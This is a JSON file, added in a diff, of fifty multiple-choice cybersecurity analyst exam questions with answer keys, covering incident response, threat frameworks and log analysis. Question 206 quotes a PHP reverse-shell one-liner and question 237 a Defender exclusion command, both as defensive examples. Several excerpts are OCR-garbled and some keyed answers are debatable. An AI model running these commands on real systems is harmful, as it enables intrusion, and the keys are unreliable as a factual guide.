@@ -1,0 +1,609 @@
+[
+  {
+    "question_number": "201",
+    "question_text": "Which of the following best describes the threat concept in which an organization works to ensure that all network users only open attachments from known sources?",
+    "image": null,
+    "options": {
+      "A": "Hacktivist threat",
+      "B": "Advanced persistent threat",
+      "C": "Unintentional insider threat  ",
+      "D": "Nation-state threat"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "202",
+    "question_text": "A security analyst has received an incident case regarding malware spreading out of control on a customer's network. The analyst is unsure how to respond. The configured EDR has automatically obtained a sample of the malware and its signature. Which of the following should the analyst perform next to determine the type of malware based on its telemetry?",
+    "image": null,
+    "options": {
+      "A": "Cross-reference the signature with open-source threat intelligence.  ",
+      "B": "Configure the EDR to perform a full scan.",
+      "C": "Transfer the malware to a sandbox environment.",
+      "D": "Log in to the affected systems and run netstat."
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "203",
+    "question_text": "A network analyst notices a long spike in traffic on port 1433 between two IP addresses on opposite sides of a WAN connection. Which of the following is the most likely cause?",
+    "image": null,
+    "options": {
+      "A": "A local red team member is enumerating the local RFC1918 segment to enumerate hosts",
+      "B": "A threat actor has a foothold on the network and is sending out control beacons",
+      "C": "An administrator executed a new database replication process without notifying the SOC  ",
+      "D": "An insider threat actor is running Responder on the local segment, creating traffic replication"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "204",
+    "question_text": "Which of the following is a useful tool for mapping, tracking, and mitigating identified threats and vulnerabilities with the likelihood and impact of occurrence?",
+    "image": null,
+    "options": {
+      "A": "Risk register  ",
+      "B": "Vulnerability assessment",
+      "C": "Penetration test",
+      "D": "Compliance report"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "205",
+    "question_text": "Which of the following is often used to keep the number of alerts to a manageable level when establishing a process to track and analyze violations?",
+    "image": null,
+    "options": {
+      "A": "Log retention",
+      "B": "Log rotation",
+      "C": "Maximum log size",
+      "D": "Threshold value  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "206",
+    "question_text": "While reviewing web server logs, a security analyst discovers the following suspicious line:\n\nphp-r '\\$socket fsockopen(\"10.0.0.1\", 1234); passthru (\"/bin/sh -i <&3 &3 2>&3\");\n\nWhich of the following is being attempted?",
+    "image": null,
+    "options": {
+      "A": "Remote file inclusion",
+      "B": "Command injection",
+      "C": "Server-side request forgery",
+      "D": "Reverse shell  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "207",
+    "question_text": "Which of the following should be updated after a lessons-learned review?",
+    "image": null,
+    "options": {
+      "A": "Disaster recovery plan",
+      "B": "Business continuity plan",
+      "C": "Tabletop exercise",
+      "D": "Incident response plan  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "208",
+    "question_text": "A software developer has been deploying web applications with common security risks to include insufficient logging capabilities. Which of the following actions would be most effective to reduce risks associated with the application development?",
+    "image": null,
+    "options": {
+      "A": "Perform static analyses using an integrated development environment",
+      "B": "Deploy compensating controls into the environment",
+      "C": "Implement server-side logging and automatic updates",
+      "D": "Conduct regular code reviews using OWASP best practices  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "209",
+    "question_text": "An analyst suspects cleartext passwords are being sent over the network. Which of the following tools would best support the analyst's investigation?",
+    "image": null,
+    "options": {
+      "A": "OpenVAS",
+      "B": "Angry IP Scanner",
+      "C": "Wireshark  ",
+      "D": "Maltego"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "210",
+    "question_text": "Using open-source intelligence gathered from technical forums, a threat actor compiles and tests a malicious downloader to ensure it will not be detected by the victim organization's endpoint security protections. Which of the following stages of the Cyber Kill Chain best aligns with the threat actor's actions?",
+    "image": null,
+    "options": {
+      "A": "Delivery",
+      "B": "Reconnaissance",
+      "C": "Exploitation",
+      "D": "Weaponization  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "211",
+    "question_text": "An organization would like to ensure its cloud infrastructure has a hardened configuration. A requirement is to create a server image that can be deployed with a secure template. Which of the following is the best resource to ensure secure configuration?",
+    "image": null,
+    "options": {
+      "A": "CIS Benchmarks  ",
+      "B": "PCI DSS",
+      "C": "OWASP Top Ten",
+      "D": "ISO 27001"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "212",
+    "question_text": "A security analyst reviews the following Arachni scan results for a web application that stores PII data:\n\nIssues (45)\n\nFixed\n\nVerified to\n\nPending verification [2]\n\nFalse positives 10\n\nListing all ingged Issues\n\nURL\n\nAwaiting review\n Input\n\nElement\n\nCross-Site Scripting (XSS) 4\n\nTOGGLE BY SEVERITY\n Reset Show at Hide al\n\nHigh\n\n18\n\nMedium\n\n3\n\nLow\n\nInformational\n\n17\n\nNAVIGATE TO\n\nCross-Site Scripting (XSS)\n\nCrass-Site Scripting (XSS) Ins 3\n\nBlind SQL Injection (timing atta 3\n\nSQL Injection\n\nRemote Flie Inclusion\n\n2\n\nBlind SQL Injection (differential 2\n\nClient-side scripts are used extensively by modern web applications. They perform from simple\n functions (such as the formatting of text) up to full manipulation of client-side data and Operating\n System interaction.\n\nCross Site Scripting (XSS) allows clients to inject scripts into a request and have the server return\n the script to the client in the response. This occurs because the application is taking untrusted data\n (in this example from the client) and reusing it without performing any validation or sanitisation.\n\nIf the injected script is returned immediately this is known as reflected XSS. II the injected script is\n stored by the server and returned to any client visiting the affected page, then this is known as\n persistent XSS (also stored XSS)\n\nArachni has discovered that it is possible to insert script content directly into HTML element\n content\n\n(CWE)\n\nWhich of the following should be remediated first?",
+    "image": null,
+    "options": {
+      "A": "SQL injection  ",
+      "B": "RFI",
+      "C": "XSS",
+      "D": "Code injection"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "213",
+    "question_text": "Which of the following stakeholders are most likely to receive a vulnerability scan report? (Choose two.)",
+    "image": null,
+    "options": {
+      "A": "Executive management  ",
+      "B": "Law enforcement",
+      "C": "Marketing",
+      "D": "Legal",
+      "E": "Product owner",
+      "F": "Systems administration  "
+    },
+    "correct_answer": "AF"
+  },
+  {
+    "question_number": "214",
+    "question_text": "Which of the following techniques can help a SOC team to reduce the number of alerts related to the internal security activities that the analysts have to triage?",
+    "image": null,
+    "options": {
+      "A": "Enrich the SIEM-ingested data to include all data required for triage",
+      "B": "Schedule a task to disable alerting when vulnerability scans are executing",
+      "C": "Filter all alarms in the SIEM with low seventy",
+      "D": "Add a SOAR rule to drop irrelevant and duplicated notifications  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "215",
+    "question_text": "An analyst is evaluating a vulnerability management dashboard. The analyst sees that a previously remediated vulnerability has reappeared on a database server. Which of the following is the most likely cause?",
+    "image": null,
+    "options": {
+      "A": "The finding is a false positive and should be ignored.",
+      "B": "A rollback had been executed on the instance.  ",
+      "C": "The vulnerability scanner was configured without credentials.",
+      "D": "The vulnerability management software needs to be updated."
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "216",
+    "question_text": "A company has decided to expose several systems to the internet. The systems are currently available internally only. A security analyst is using a subset of CVSS3.1 exploitability metrics to prioritize the vulnerabilities that would be the most exploitable when the systems are exposed to the internet. The systems and the vulnerabilities are shown below:\n\n\"System\n\",\"Vulnerability\n name\n\",\"Attack\n vector\n\",\"Attack\n complexity\n\",\"Availability\n\"\r\n\"blane\n\",\"snakedoctor\n\",\"AV:N\n\",\"AC:L\n\",\"A:H\n\"\r\n\"brown\n\",\"coolbreeze\n\",\"AVIL\n\",\"AC:L\n\",\"A:H\n\"\r\n\"sullivan\n\",\"redcap\n\",\"AV:P\n\",\"AC:H\n\",\"A:H\n\"\r\n\"grey\n\",\"bettyblue\n\",\"AV:N\n\",\"AC:H\n\",\"A:N\n\"\n\nWhich of the following systems should be prioritized for patching?",
+    "image": null,
+    "options": {
+      "A": "brown",
+      "B": "grey",
+      "C": "blane  ",
+      "D": "sullivan"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "217",
+    "question_text": "During an incident in which a user machine was compromised, an analyst recovered a binary file that potentially caused the exploitation. Which of the following techniques could be used for further analysis?",
+    "image": null,
+    "options": {
+      "A": "Fuzzing",
+      "B": "Static analysis",
+      "C": "Sandboxing  ",
+      "D": "Packet capture"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "218",
+    "question_text": "A leader on the vulnerability management team is trying to reduce the team's workload by automating some simple but time-consuming tasks. Which of the following activities should the team leader consider first?",
+    "image": null,
+    "options": {
+      "A": "Assigning a custom recommendation for each finding",
+      "B": "Analyzing false positives",
+      "C": "Rendering an additional executive report",
+      "D": "Regularly checking agent communication with the central console  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "219",
+    "question_text": "The Chief Information Security Officer (CISO) of a large management firm has selected a cybersecurity framework that will help the organization demonstrate its investment in tools and systems to protect its data. Which of the following did the CISO most likely select?",
+    "image": null,
+    "options": {
+      "A": "PCI DSS",
+      "B": "COBIT",
+      "C": "ISO 27001  ",
+      "D": "ITIL"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "220",
+    "question_text": "A high volume of failed RDP authentication attempts was logged on a critical server within a one-hour period. All of the attempts originated from the same remote IP address and made use of a single valid domain user account. Which of the following would be the most effective mitigating control to reduce the rate of success of this brute-force attack?",
+    "image": null,
+    "options": {
+      "A": "Enabling a user account lockout after a limited number of failed attempts  ",
+      "B": "Installing a third-party remote access tool and disabling RDP on all devices",
+      "C": "Implementing a firewall block for the remote system's IP address",
+      "D": "Increasing the verbosity of log-on event auditing on all devices"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "221",
+    "question_text": "An incident response analyst is investigating the root cause of a recent malware outbreak. Initial binary analysis indicates that this malware disables host security services and performs cleanup routines on its infected hosts, including deletion of initial dropper and removal of event log entries and prefetch files from the host. Which of the following data sources would most likely reveal evidence of the root cause? (Choose two.)",
+    "image": null,
+    "options": {
+      "A": "Creation time of dropper",
+      "B": "Registry artifacts  ",
+      "C": "EDR data",
+      "D": "Prefetch files",
+      "E": "File system metadata  ",
+      "F": "Sysmon event log"
+    },
+    "correct_answer": "BE"
+  },
+  {
+    "question_number": "222",
+    "question_text": "When undertaking a cloud migration of multiple SaaS applications, an organization's systems administrators struggled with the complexity of extending identity and access management to cloud-based assets. Which of the following service models would have reduced the complexity of this project?",
+    "image": null,
+    "options": {
+      "A": "CASB  ",
+      "B": "SASE",
+      "C": "ZTNA",
+      "D": "SWG"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "223",
+    "question_text": "A security analyst reviews the following extract of a vulnerability scan that was performed against the web server:\n\nSTATE SERVICE\n\nVERSION\n\n22/tcp open ssh\n Bitcp open http\n\nhttp-enum:\n\nOpenSSH 8.2p1 Ubuntu ubuntu@ (Ubuntu Linux; protocol 2.0)\n Apache httpd 2.4.52 ((Ubuntu))\n\n/wp-login.php: Possible admin folder\n /info.php: Possible information File\n\n/readme.html: wordpress version: 2\n\n/wp-includes/images/rss.png: wordpress version 2.2 found.\n\n/wp-includes/js/jquery/suggest.js: wordpress version 2.5 found.\n\n/wp-includes/images/blank.gif: wordpress version 2.6 found.\n\n/wp-includes/js/comment-reply.js: Wordpress version 2.7 found.\n\n/wp-login.php: wordpress login page.\n\n/wp-admin/upgrade.php: Wordpress login page.\n\n/readme.html: Interesting, a readme.\n\nI http-server-header: Apache/2.4.52 (Ubuntu)\n 643/tcp open tcpwrapped\n\nWhich of the following recommendations should the security analyst provide to harden the web server?",
+    "image": null,
+    "options": {
+      "A": "Remove the version information on http-server-header.  ",
+      "B": "Disable tcp_wrappers.",
+      "C": "Delete the/wp-login.php folder.",
+      "D": "Close port 22."
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "224",
+    "question_text": "A security analyst is responding to an incident that involves a malicious attack on a network data closet. Which of the following best explains how the analyst should properly document the incident?",
+    "image": null,
+    "options": {
+      "A": "Back up the configuration file for all network devices.",
+      "B": "Record and validate each connection.",
+      "C": "Create a full diagram of the network infrastructure.",
+      "D": "Take photos of the impacted items.  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "225",
+    "question_text": "A cybersecurity analyst is participating with the DLP project team to classify the organization's data. Which of the following is the primary purpose for classifying data?",
+    "image": null,
+    "options": {
+      "A": "To identify regulatory compliance requirements",
+      "B": "To facilitate the creation of DLP rules",
+      "C": "To prioritize IT expenses",
+      "D": "To establish the value of data to the organization  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "226",
+    "question_text": "A security analyst observed the following activity from a privileged account:\n\n• Accessing emails and sensitive information\n\n• Audit logs being modified\n\n• Abnormal log-in times\n\nWhich of the following best describes the observed activity?",
+    "image": null,
+    "options": {
+      "A": "Irregular peer-to-peer communication",
+      "B": "Unauthorized privileges",
+      "C": "Rogue devices on the network",
+      "D": "Insider attack  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "227",
+    "question_text": "A vulnerability management team found four major vulnerabilities during an assessment and needs to provide a report for the proper prioritization for further mitigation. Which of the following vulnerabilities should have the highest priority for the mitigation process?",
+    "image": null,
+    "options": {
+      "A": "A vulnerability that has related threats and loCs, targeting a different industry",
+      "B": "A vulnerability that is related to a specific adversary campaign, with loCs found in the SIEM  ",
+      "C": "A vulnerability that has no adversaries using it or associated loCs",
+      "D": "A vulnerability that is related to an isolated system, with no loCs"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "228",
+    "question_text": "A security analyst received an alert regarding multiple successful MFA log-ins for a particular user. When reviewing the authentication logs, the analyst sees the following:\n\n\"Time\n\",\"Username\n\",\"Application\n\",\"Access device\n\",\"MFA device\n\"\r\n\"16:07 UTC\n\",\"jdoe\n\",\"Productivity Portal\n\",\"1.2.3.4 (United\n States)\n\",\"1.2.3.4 (United\n\n\nStates)\n\"\r\n\"16:11 UTC\n\",\"jdoe\n\",\"HR Portal\n\",\"1.2.3.4 (United\n States)\n\",\"1.2.3.4 (United\n\n\nStates)\n\"\r\n\"17:28 UTC\n\",\"jdoe\n\",\"Productivity Portal\n\",\"3.4.5.6 (Russia)\n\",\"1.2.3.4 (United\n States)\n\"\r\n\"17:30 UTC\n\",\"jdoe\n\",\"Productivity Portal\n\",\"1.2.3.4 (United\n States)\n\",\"1.2.3.4 (United\n States)\n\"\r\n\"17:31 UTC\n\",\"jdoe\n\",\"HR Portal\n\",\"3.4.5.6 (Russia)\n\",\"3.4.5.6 (Russia)\n\"\n\nWhich of the following are most likely occurring, base on the MFA logs? (Choose two.)",
+    "image": null,
+    "options": {
+      "A": "Dictionary attack",
+      "B": "Push phishing  ",
+      "C": "Impossible geo-velocity  ",
+      "D": "Subscriber identity module swapping",
+      "E": "Rogue access point",
+      "F": "Password spray"
+    },
+    "correct_answer": "BC"
+  },
+  {
+    "question_number": "229",
+    "question_text": "A security analyst has identified a new malware file that has impacted the organization. The malware is polymorphic and has built-in conditional triggers that require a connection to the internet. The CPU has an idle process of at least 70%. Which of the following best describes how the security analyst can effectively review the malware without compromising the organization's network?",
+    "image": null,
+    "options": {
+      "A": "Utilize an RDP session on an unused workstation to evaluate the malware.",
+      "B": "Disconnect and utilize an existing infected asset off the network.",
+      "C": "Create a virtual host for testing on the security analyst workstation.",
+      "D": "Subscribe to an online service to create a sandbox environment.  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "230",
+    "question_text": "Which of the following threat-modeling procedures is in the OWASP Web Security Testing Guide?",
+    "image": null,
+    "options": {
+      "A": "Review of security requirements",
+      "B": "Compliance checks",
+      "C": "Decomposing the application  ",
+      "D": "Security by design"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "231",
+    "question_text": "Which of the following would an organization use to develop a business continuity plan?",
+    "image": null,
+    "options": {
+      "A": "A diagram of all systems and interdependent applications",
+      "B": "A repository for all the software used by the organization",
+      "C": "A prioritized list of critical systems defined by executive leadership",
+      "D": "A configuration management database in print at an off-site location"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "232",
+    "question_text": "The management team requests monthly KPI reports on the company's cybersecurity program. Which of the following KPIs would identify how long a security threat goes unnoticed in the environment?",
+    "image": null,
+    "options": {
+      "A": "Employee turnover",
+      "B": "Intrusion attempts",
+      "C": "Mean time to detect  ",
+      "D": "Level of preparedness"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "233",
+    "question_text": "Which of the following best describes the key elements of a successful information security program?",
+    "image": null,
+    "options": {
+      "A": "Business impact analysis, asset and change management, and security communication plan",
+      "B": "Security policy implementation, assignment of roles and responsibilities, and information asset classification  ",
+      "C": "Disaster recovery and business continuity planning, and the definition of access control requirements and human resource policies",
+      "D": "Senior management organizational structure, message distribution standards, and procedures for the operation of security management systems"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "234",
+    "question_text": "A systems administrator notices unfamiliar directory names on a production server. The administrator reviews the directory listings and files, and then concludes the server has been compromised. Which of the following steps should the administrator take next?",
+    "image": null,
+    "options": {
+      "A": "Inform the internal incident response team.",
+      "B": "Follow the company's incident response plan.  ",
+      "C": "Review the lessons learned for the best approach.",
+      "D": "Determine when the access started."
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "235",
+    "question_text": "Which of the following is a nation-state actor least likely to be concerned with?",
+    "image": null,
+    "options": {
+      "A": "Detection by MITRE ATT&CK framework.",
+      "B": "Detection or prevention of reconnaissance activities.",
+      "C": "Examination of its actions and objectives.",
+      "D": "Forensic analysis for legal action of the actions taken.  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "236",
+    "question_text": "Which of the following is a commonly used four-component framework to communicate threat actor behavior?",
+    "image": null,
+    "options": {
+      "A": "STRIDE",
+      "B": "Diamond Model of Intrusion Analysis  ",
+      "C": "Cyber Kill Chain",
+      "D": "MITRE ATT&CK"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "237",
+    "question_text": "An employee downloads a freeware program to change the desktop to the classic look of legacy Windows. Shortly after the employee installs the program, a high volume of random DNS queries begin to originate from the system. An investigation on the system reveals the following:\n\nAdd-MpPreference-ExclusionPath '%Program Files%\\\\ksyconfig'\n\nWhich of the following is possibly occurring?",
+    "image": null,
+    "options": {
+      "A": "Persistence",
+      "B": "Privilege escalation",
+      "C": "Credential harvesting",
+      "D": "Defense evasion  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "238",
+    "question_text": "An organization discovered a data breach that resulted in PII being released to the public. During the lessons learned review, the panel identified discrepancies regarding who was responsible for external reporting, as well as the timing requirements. Which of the following actions would best address the reporting issue?",
+    "image": null,
+    "options": {
+      "A": "Creating a playbook denoting specific SLAs and containment actions per incident type",
+      "B": "Researching federal laws, regulatory compliance requirements, and organizational policies to document specific reporting SLAS  ",
+      "C": "Defining which security incidents require external notifications and incident reporting in addition to internal stakeholders",
+      "D": "Designating specific roles and responsibilities within the security team and stakeholders to streamline tasks"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "239",
+    "question_text": "During an incident, a security analyst discovers a large amount of PII has been emailed externally from an employee to a public email address. The analyst finds that the external email is the employee's personal email. Which of the following should the analyst recommend be done first?",
+    "image": null,
+    "options": {
+      "A": "Place a legal hold on the employee's mailbox.",
+      "B": "Enable filtering on the web proxy.",
+      "C": "Disable the public email access with CASB.  ",
+      "D": "Configure a deny rule on the firewall."
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "240",
+    "question_text": "Which of the following can be used to learn more about TTPs used by cybercriminals?",
+    "image": null,
+    "options": {
+      "A": "ZenMAP",
+      "B": "MITRE ATT&CK  ",
+      "C": "National Institute of Standards and Technology",
+      "D": "theHarvester"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "241",
+    "question_text": "Which of the following statements best describes the MITRE ATT&CK framework?",
+    "image": null,
+    "options": {
+      "A": "It provides a comprehensive method to test the security of applications.",
+      "B": "It provides threat intelligence sharing and development of action and mitigation strategies.",
+      "C": "It helps identify and stop enemy activity by highlighting the areas where an attacker functions.  ",
+      "D": "It tracks and understands threats and is an open-source project that evolves.",
+      "E": "It breaks down intrusions into a clearly defined sequence of phases."
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "242",
+    "question_text": "A Chief Information Security Officer (CISO) is concerned that a specific threat actor who is known to target the company's business type may be able to breach the network and remain inside of it for an extended period of time. Which of the following techniques should be performed to meet the CISO's goals?",
+    "image": null,
+    "options": {
+      "A": "Vulnerability scanning",
+      "B": "Adversary emulation  ",
+      "C": "Passive discovery",
+      "D": "Bug bounty"
+    },
+    "correct_answer": "B"
+  },
+  {
+    "question_number": "243",
+    "question_text": "A security analyst receives an alert for suspicious activity on a company laptop. An excerpt of the log is shown below:\n\n\"Event\n #\n\",\"Process\n\",\"Parent process\n\"\r\n\"1\n\",\"Console Windows Host\n (conhost.exe)\n\",\"System (-)\n\"\r\n\"2\n\",\"Console Windows Host\n (conhost.exe)\n\",\"Command Prompt (cmd.exe)\n\"\r\n\"3\n\",\"Windows Explorer\n (Explorer.exe)\n\",\"Microsoft Outlook\n (outlook.exe)\n\"\r\n\"4\n\",\"Microsoft Outlook\n (outlook.exe)\n\",\"Microsoft Word\n (winword.exe)\n\"\r\n\"5\n\",\"Microsoft Word\n (winword.exe)\n\",\"PowerShell\n\n\n(powershell.exe)\n\"\r\n\"6\n\",\"Windows Explorer\n\",\"Google Chrome\n\"\r\n,\"(Explorer.exe)\n\",\"(chrome.exe)\n\"\n\nWhich of the following has most likely occurred?",
+    "image": null,
+    "options": {
+      "A": "An Office document with a malicious macro was opened.  ",
+      "B": "A credential-stealing website was visited.",
+      "C": "A phishing link in an email was clicked.",
+      "D": "A web browser vulnerability was exploited."
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "244",
+    "question_text": "During an incident, some loCs of possible ransomware contamination were found in a group of servers in a segment of the network. Which of the following steps should be taken next?",
+    "image": null,
+    "options": {
+      "A": "Isolation  ",
+      "B": "Remediation",
+      "C": "Reimaging",
+      "D": "Preservation"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "245",
+    "question_text": "An MSSP received several alerts from customer 1, which caused a missed incident response deadline for customer 2. Which of the following best describes the document that was violated?",
+    "image": null,
+    "options": {
+      "A": "ΚΡΙ",
+      "B": "SLO",
+      "C": "SLA  ",
+      "D": "MOU"
+    },
+    "correct_answer": "C"
+  },
+  {
+    "question_number": "246",
+    "question_text": "Which of the following is a reason proper handling and reporting of existing evidence are important for the investigation and reporting phases of an incident response?",
+    "image": null,
+    "options": {
+      "A": "To ensure the report is legally acceptable in case it needs to be presented in court  ",
+      "B": "To present a lessons-learned analysis for the incident response team",
+      "C": "To ensure the evidence can be used in a postmortem analysis",
+      "D": "To prevent the possible loss of a data source for further root cause analysis"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "247",
+    "question_text": "An attacker has just gained access to the syslog server on a LAN. Reviewing the syslog entries has allowed the attacker to prioritize possible next targets. Which of the following is this an example of?",
+    "image": null,
+    "options": {
+      "A": "Passive network footprinting  ",
+      "B": "OS fingerprinting",
+      "C": "Service port identification",
+      "D": "Application versioning"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "248",
+    "question_text": "A security analyst observed the following activities in chronological order:\n\n1. Protocol violation alerts on external firewall\n\n2. Unauthorized internal scanning activity\n\n3. Changes in outbound network performance\n\nWhich of the following best describes the goal of the threat actor?",
+    "image": null,
+    "options": {
+      "A": "Data exfiltration  ",
+      "B": "Unusual traffic spikes",
+      "C": "Rogue devices",
+      "D": "Irregular peer-to-peer communication"
+    },
+    "correct_answer": "A"
+  },
+  {
+    "question_number": "249",
+    "question_text": "After reviewing the final report for a penetration test, a cybersecurity analyst prioritizes the remediation for input validation vulnerabilities. Which of the following attacks is the analyst seeking to prevent?",
+    "image": null,
+    "options": {
+      "A": "DNS poisoning",
+      "B": "Pharming",
+      "C": "Phishing",
+      "D": "Cross-site scripting  "
+    },
+    "correct_answer": "D"
+  },
+  {
+    "question_number": "250",
+    "question_text": "During a security test, a security analyst found a critical application with a buffer overflow vulnerability. Which of the following would be best to mitigate the vulnerability at the application level?",
+    "image": null,
+    "options": {
+      "A": "Perform OS hardening.",
+      "B": "Implement input validation.  ",
+      "C": "Update third-party dependencies.",
+      "D": "Configure address space layout randomization."
+    },
+    "correct_answer": "B"
+  }
+]
